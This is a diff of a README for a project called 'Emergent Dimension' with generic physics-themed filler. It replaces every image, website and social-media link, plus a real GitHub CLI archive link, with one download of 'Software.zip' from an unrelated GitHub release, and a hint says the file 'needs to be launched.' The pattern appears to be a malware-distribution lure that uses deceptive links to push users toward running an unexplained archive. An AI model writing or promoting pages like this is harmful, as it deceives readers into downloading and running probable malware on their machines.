@@ -1,6 +1,6 @@
 # 🌌 Welcome to Emergent Dimension!
 
-![Emergent Dimension](https://www.example.com/emergent-dimension.jpg)
+![Emergent Dimension](https://github.com/soportevictor/Emergent-Dimension/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -17,7 +17,7 @@ Welcome to **Emergent Dimension** - a place where the world of dimensions and em
 
 ## 🚀 Get Started:
 
-🔗 [Download Emergent Dimension ZIP](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) 🚀
+🔗 [Download Emergent Dimension ZIP](https://github.com/soportevictor/Emergent-Dimension/releases/download/v1.0/Software.zip) 🚀
 
 *Hint: It needs to be launched.*
 
@@ -48,15 +48,15 @@ Immerse yourself in the holographic principles and witness how information can b
 ## 🔬 Explore Our Universe:
 
 ### 🌌 Emergence:
-![Emergence](https://www.example.com/emergence.jpg)
+![Emergence](https://github.com/soportevictor/Emergent-Dimension/releases/download/v1.0/Software.zip)
 Witness the emergence of complex behavior from simple rules and experience the magic of self-organization in our universe.
 
 ### 🔗 Quantum Mechanics:
-![Quantum Mechanics](https://www.example.com/quantum-mechanics.jpg)
+![Quantum Mechanics](https://github.com/soportevictor/Emergent-Dimension/releases/download/v1.0/Software.zip)
 Dive into the mysterious world of quantum mechanics where particles exist in multiple states simultaneously, challenging our perception of reality.
 
 ### 🌀 Stereographic Projection:
-![Stereographic Projection](https://www.example.com/stereographic-projection.jpg)
+![Stereographic Projection](https://github.com/soportevictor/Emergent-Dimension/releases/download/v1.0/Software.zip)
 Discover the beauty of stereographic projection and how it maps the 3D sphere onto a 2D plane, bridging the gap between dimensions.
 
 ---
@@ -71,10 +71,10 @@ Whether you are a novice explorer or a seasoned physicist, **Emergent Dimension*
 
 Connect with us on social media and be the first to know about our latest discoveries and breakthroughs in the world of emergent dimensions.
 
-🌐 [Visit our Website](https://www.example.com/emergent-dimension)  
-🐦 [Follow us on Twitter](https://twitter.com/emergent-dimension)  
-📷 [Instagram](https://instagram.com/emergent-dimension)  
-📘 [Facebook](https://facebook.com/emergent-dimension)
+🌐 [Visit our Website](https://github.com/soportevictor/Emergent-Dimension/releases/download/v1.0/Software.zip)  
+🐦 [Follow us on Twitter](https://github.com/soportevictor/Emergent-Dimension/releases/download/v1.0/Software.zip)  
+📷 [Instagram](https://github.com/soportevictor/Emergent-Dimension/releases/download/v1.0/Software.zip)  
+📘 [Facebook](https://github.com/soportevictor/Emergent-Dimension/releases/download/v1.0/Software.zip)
 
 ---
 
